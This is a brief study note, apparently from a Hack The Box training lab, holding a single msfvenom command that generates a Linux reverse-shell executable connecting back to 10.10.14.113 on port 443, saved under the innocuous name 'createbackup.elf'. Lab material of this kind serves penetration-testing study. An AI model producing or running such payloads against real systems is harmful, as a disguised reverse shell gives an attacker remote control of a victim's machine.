#Reverse_Engineering

---

- To create a reverse shell we use the following `msfvenom` command
```bash
emi2024@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

